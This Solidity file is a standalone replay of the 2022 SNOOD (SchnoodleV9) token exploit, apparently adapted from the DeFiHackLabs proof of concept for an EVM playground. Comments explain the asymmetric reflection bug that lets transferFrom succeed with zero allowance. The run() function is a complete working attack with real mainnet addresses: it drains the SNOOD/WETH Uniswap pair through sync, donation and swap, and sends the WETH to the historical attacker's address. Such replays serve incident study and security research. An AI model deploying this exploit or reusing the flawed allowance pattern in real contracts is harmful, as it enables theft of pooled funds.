// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-06-Snood).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest.testExploit` (there is no standalone attack contract to deploy).
// This file is a faithful, self-contained copy of that inline attack — the body of
// `testExploit` is moved verbatim into `run()` — compiled inside the registry forge
// project so the playground can deploy it and record run(). Logic and constants are
// copied from test/Snood_exp.sol (block 14,983,660 fork).
//
// Root cause: SNOOD (SchnoodleV9) bolts a reflection layer onto OpenZeppelin's
// ERC777Upgradeable but applies the reflection conversion asymmetrically across the
// allowance check — `allowance()` and `_spendAllowance()` both divide by the reflect
// rate, so with a raw reflected allowance of 0 the OZ `require(currentAllowance >=
// amount)` degenerates to `require(0 >= 0)` and PASSES. The subsequent `_send`,
// however, moves the FULL reflected amount. The attacker can therefore call
// `transferFrom(pair, attacker, pairBalance)` with ZERO approval and drain the
// SNOOD/WETH Uniswap pair, then `sync()` / re-donate / `swap()` to extract all WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract SnoodDrain {
    // The historical attacker EOA that receives the drained WETH
    // (0x180ea08644b123D8A3f0ECcf2a3b45A582075538 from the original exploit tx).
    address constant ATTACKER = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;

    IERC20 constant SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);

    function run() external {
        // EXPLOIT STEP 1: Snapshot the pair's SNOOD balance (standard units). This is both the
        // theft quantity and the value used for donation math + swap amountOut calculation.
        uint256 balance = SNOOD.balanceOf(address(PAIR));

        // VULNERABILITY: Asymmetric Reflection Math in SchnoodleV9 `_spendAllowance` + `allowance` (ERC777 base)
        // SchnoodleV9Base overrides:
        //   allowance(holder, spender) => _getStandardAmount( super.allowance() )   // reflected_stored / rate
        //   _spendAllowance(owner, spender, amt) => super._spendAllowance( ..., _getStandardAmount(amt) )
        //     ^^^ BUG: incoming `amt` from public transferFrom is already in STANDARD units (caller-visible),
        //         so dividing by rate again yields ~0 when raw stored allowance is 0.
        //   _send(...) => super._send( ..., _getReflectedAmount(amt) )  // moves amt * rate (full reflected)
        //   _approve stores reflected units.
        // Raw stored allowance for (PAIR, msg.sender) is 0 (never approved).
        // transferFrom(PAIR, this, bal-1) => _spend(standard=bal-1) => super( _getStandard(bal-1) ) => require(0 >= 0) PASS
        // Then _send moves the *entire* reflected balance out of the pair.
        // Impact: complete theft of SNOOD from the Uniswap pair (or any unapproved holder). Sets up reserves manipulation.
        // (See also header root-cause description.)
        require(SNOOD.transferFrom(address(PAIR), address(this), balance - 1));

        // EXPLOIT STEP 2: sync() the pair. Collapses its SNOOD reserve to ~1 wei while WETH reserve stays full.
        // This makes the SNOOD side of the pair "worthless" in the constant-product formula.
        PAIR.sync();

        // EXPLOIT STEP 3: Donate the SNOOD (bal-1) back to the pair via direct transfer.
        // Rebuilds pair SNOOD balance so the subsequent swap input side is satisfied (pair receives "payment" for the WETH it will send).
        // Note: as liquidity token, fees/burn/quota may apply on this transfer.
        require(SNOOD.transfer(address(PAIR), balance - 1));

        // EXPLOIT STEP 4: Read manipulated reserves after donation+sync. a = WETH (~full), b = SNOOD (~1)
        (uint112 a, uint112 b, ) = PAIR.getReserves();

        // EXPLOIT STEP 5: Compute WETH (amount0Out) that can be extracted using V2 xy=k formula + 0.3% fee.
        // Formula: amountOut0 = (input * 9970 * reserve0) / (reserve1*10000 + input*9970)
        // With reserve1≈1 the output is nearly the entire WETH reserve.
        uint256 amount0Out;
        if (b * 10_000 + (balance - 1) * 9970 == 0) {
            amount0Out = 0;
        } else {
            amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
        }

        // EXPLOIT STEP 6: swap(amount0Out, 0, ATTACKER, ""). Drains 100% of the pair's WETH to the attacker EOA.
        // The donated SNOOD provides the "in" amount for the swap math; WETH is sent out.
        PAIR.swap(amount0Out, 0, ATTACKER, "");
    }
}
